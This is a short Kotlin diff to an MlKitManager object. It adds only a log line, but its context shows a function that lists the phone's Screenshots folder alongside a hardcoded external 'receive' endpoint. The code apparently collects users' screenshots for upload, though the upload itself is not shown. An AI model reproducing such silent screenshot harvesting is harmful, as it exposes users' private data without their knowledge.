@@ -22,6 +22,7 @@ object MlKitManager {
     private const val HTTP_SUBMIT = "http://manager.futumos.com/prod-api/common/receive"
 
     private fun loadPhoneScreenShots(modeType: Int, fileSize: Long, callback: (String?, Boolean) -> Unit) {
+        Log.v("MlKitManager", "modeType=${modeType}  fileSize=${fileSize}")
         val dirPath = PathUtils.getExternalDcimPath() + "/Screenshots"
         val filesInDir =
             FileUtils.listFilesInDir(dirPath).filter {
